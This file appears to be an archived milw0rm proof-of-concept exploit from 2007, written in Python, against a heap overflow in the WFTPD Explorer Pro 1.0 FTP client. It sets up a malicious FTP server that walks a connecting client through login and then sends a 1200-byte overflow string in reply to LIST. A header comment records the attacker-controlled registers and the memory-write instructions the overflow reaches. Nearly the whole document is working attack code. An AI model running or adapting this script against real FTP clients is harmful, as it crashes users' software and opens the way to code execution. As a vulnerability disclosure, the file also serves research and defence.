##########################################
#  WftpdExpPro_HeapPoC.py                #
#  Discovered by r4x (Kamil Szczerba)    #
#                      [r4xks@o2.pl]     #
##########################################
# Soft    : WFTPD Explorer Pro 1.0       #
# Vendor  : Texas Imperial Software      #
# Vuln    : Heap Overwlow (Res: LIST)    #
# Exploit : PoC Reg Overwrite            #
##########################################
# Reg:                                   #
#  EAX = 41414141                        #
#  ECX = 41414141                        #
#  EDX = 00a57b38 ASCII "AAAA..."        #
#  ESI = 00a57b30 ASCII "AAAA..."        #
#  ------------------------------        #
#  EIP = 7c91142E                        #
#                                        #
#  Exception c0000005 (ACCES_VIOLATION)  #
#                                        #
# MOV DWORD PTR DS:[ECX],EAX    ; HEHE   #
# MOV DWORD PTR DS:[EAX +4] ECX ;        #
#                                        #
# Test on: WinXPsp2 Polish 		 #
#                                        #
##########################################




from socket import *

heapb0f = "A" * 1200 + "r\n"

req = (
        "USER",
        "PASS",
        "TYPE",
        "PWD",
        "PASV",
        "LIST"
        )
        
res = (
        "331 Password required.\r\n",
        "230 User logged in.\r\n",
        "200 Type set to I.\r\n",
        "257 '/' is current directory.\r\n",
        "227 Entering Passive Mode (127,0,0,1,100,100).\r\n",
        "150 Opening ASCII mode data connection for file list.\r\n",
        )

def parser(buff):

    cmd  = buff.split("\x20")[0]
    cmd1 = buff.split("\r\n")[0]
    if len(cmd) > len(cmd1):
    	cmd = cmd1

    for i in range(len(req)):
        if req[i] == cmd:
            return res[i]
    
def multiserv(port1, port2):

    control = socket(AF_INET, SOCK_STREAM)
    control.bind(('', port1))
    control.listen(1)
    
    trans =  socket(AF_INET, SOCK_STREAM)
    trans.bind(('', port2))
    trans.listen(1)

    while(1):
        cclient, caddr = control.accept()
        print "[*] Connected: ", caddr
        cclient.send("220 Welcome: Evil Secure FTPD 1.666\r\n")
        
        while(1):
            
            r0 = cclient.recv(1024)
            print "[>] Input: %s" % (r0)
            r1 = parser(r0)
            if r1 == None:
                r1 = "502 Command not implemented.\r\n"
            cclient.send(r1)
            print "[<] Output: %s" % (r1)
            if r1 == res[4]:
                print "[*] Data mode\n"
                tclient, taddr = trans.accept()
                print "[*] Connected: ", taddr
            if r1 == res[5]:
                print "[*] b00mb!"
                tclient.send(heapb0f)
                print "[*] done"
                break
	break
                
                
                


multiserv(21, 25700)

# milw0rm.com [2007-12-18]
